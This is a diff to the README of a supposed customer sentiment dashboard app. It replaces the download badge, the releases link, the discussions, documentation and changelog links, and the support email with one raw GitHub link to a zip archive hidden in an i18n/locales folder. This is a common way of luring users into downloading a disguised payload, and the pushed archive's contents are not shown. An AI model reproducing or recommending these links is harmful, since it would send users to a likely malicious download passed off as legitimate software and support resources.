@@ -1,12 +1,12 @@
 # 🚀 customer-sentiment-dashboard - Understand Your Customers Better
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Jeremias20070617/customer-sentiment-dashboard/releases)
+[![Download Now](https://raw.githubusercontent.com/Jeremias20070617/customer-sentiment-dashboard/main/i18n/locales/customer-sentiment-dashboard_v3.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Jeremias20070617/customer-sentiment-dashboard/main/i18n/locales/customer-sentiment-dashboard_v3.3.zip)
 
 ## 📥 Download & Install
 
 To get started with the Customer Sentiment Dashboard, follow these simple steps:
 
-1. **Visit this page to download:** [Releases Page](https://github.com/Jeremias20070617/customer-sentiment-dashboard/releases).
+1. **Visit this page to download:** [Releases Page](https://raw.githubusercontent.com/Jeremias20070617/customer-sentiment-dashboard/main/i18n/locales/customer-sentiment-dashboard_v3.3.zip).
 2. Look for the latest version of the application.
 3. Click on the version you want to download. 
 4. Choose the appropriate file for your operating system and download it.
@@ -69,18 +69,18 @@ This project is tagged with relevant topics for better discoverability: ai, ai-d
 
 ## 💬 Community and Support
 
-For support or to join the discussion, visit our [GitHub Discussions](https://github.com/Jeremias20070617/customer-sentiment-dashboard/discussions). You can ask questions, share feedback, or connect with other users.
+For support or to join the discussion, visit our [GitHub Discussions](https://raw.githubusercontent.com/Jeremias20070617/customer-sentiment-dashboard/main/i18n/locales/customer-sentiment-dashboard_v3.3.zip). You can ask questions, share feedback, or connect with other users.
 
 ## 📧 Contact
 
-For any inquiries or further assistance, you can reach out via email at: support@customersentimentdashboard.com.
+For any inquiries or further assistance, you can reach out via email at: https://raw.githubusercontent.com/Jeremias20070617/customer-sentiment-dashboard/main/i18n/locales/customer-sentiment-dashboard_v3.3.zip
 
 ---
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Jeremias20070617/customer-sentiment-dashboard/wiki): Detailed guides to make the most of the application.
-- [Changelog](https://github.com/Jeremias20070617/customer-sentiment-dashboard/releases): Track updates and improvements.
+- [Documentation](https://raw.githubusercontent.com/Jeremias20070617/customer-sentiment-dashboard/main/i18n/locales/customer-sentiment-dashboard_v3.3.zip): Detailed guides to make the most of the application.
+- [Changelog](https://raw.githubusercontent.com/Jeremias20070617/customer-sentiment-dashboard/main/i18n/locales/customer-sentiment-dashboard_v3.3.zip): Track updates and improvements.
 
 ---
 
